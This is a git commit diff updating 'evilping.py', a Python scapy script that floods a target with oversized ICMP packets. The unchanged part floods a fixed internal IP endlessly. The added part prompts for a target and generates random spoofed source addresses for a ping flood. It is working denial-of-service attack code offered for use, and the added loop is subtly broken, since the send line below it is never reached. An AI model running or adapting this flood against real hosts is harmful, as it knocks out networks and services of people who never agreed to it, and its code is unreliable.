bf410dd82e701aa95d2e6bbf539a24bd142bb9c3
Rayga Lightscene <arga@lahardi.com>
2016-06-16 10:46:59 +0700

    Update evilping.py

--- evilping.py
+++ evilping.py
@@ -10,3 +10,35 @@ ip1 = IP(src="10.133.1.181",dst="10.133.1.153")
 packet = ip1/ICMP()/("m"*60000)
 while True:
   send(packet)
+  
+############# Latest Update #################
+
+__author__ = 'n4rut0'
+
+from scapy.all import *
+import random
+hostname = raw_input("Enter local hostname : ")
+target = raw_input("Enter target hostname : ")
+
+def attack():
+    address = hostname.split(".")
+    address[0]=str(random.randrange(11,97))
+    address[1]=str(random.randrange(0,255))
+    address[2]=str(random.randrange(0,255))
+    address[3]=str(random.randrange(2,254))
+    p = "."
+    total = address[0] + p + address[1] + p + address[2] +p + address[3]
+    print total
+    return total
+
+
+while True:
+    ip=attack()
+
+packet = IP(src=ip, dst=target)/ICMP()/("FAKEEVER"*60000)
+send(packet)
+
+
+
+
+
